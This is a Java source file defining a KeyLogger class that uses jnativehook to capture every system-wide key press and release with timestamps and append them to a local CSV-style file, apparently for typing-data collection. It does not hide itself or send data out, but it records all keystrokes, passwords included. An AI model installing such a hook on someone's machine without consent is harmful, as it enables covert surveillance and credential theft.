package application;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.logging.Level;


import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;


public class KeyLogger implements NativeKeyListener
{
	private LinkedList<LogEntry> input_list = new LinkedList<LogEntry>();
	private Path path; 
	private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);
	
	public KeyLogger(Path p)
	{
		path = p;
	}


	public void nativeKeyPressed(NativeKeyEvent e)
	{
		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
		
		if (keyText.length() > 1) 
			keyText = "[" + keyText + "]";
		
		LogEntry kv = new LogEntry(keyText, "+", System.currentTimeMillis());
		input_list.add(kv);
	}
	public void nativeKeyReleased(NativeKeyEvent e)
	{
		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
		
		if (keyText.length() > 1) 
			keyText = "[" + keyText + "]";
		
		LogEntry kv = new LogEntry(keyText, "-", System.currentTimeMillis());
		input_list.add(kv);
	}
	
	public void writeToFile()
	{
		Iterator<LogEntry> itr = input_list.iterator();
		try (OutputStream os = Files.newOutputStream(this.path, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
				StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) 
		{

			while(itr.hasNext())
			{
				LogEntry currentElement = itr.next();
				writer.println(currentElement.getKey() + "," + currentElement.getEvent() + "," + currentElement.getTimeStamp());
			}
			
		} catch (IOException ex) 
		{
			logger.error(ex.getMessage(), ex);
			System.exit(-1);
		}
	}


	public void nativeKeyTyped(NativeKeyEvent e) 
	{
		// Nothing here
	}
	
	  public static void init() 
	  {
	        
	        // Get the logger for "org.jnativehook" and set the level to warning.
	        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
	        logger.setLevel(Level.WARNING);

	        // Don't forget to disable the parent handlers.
	        logger.setUseParentHandlers(false);
	    }
}
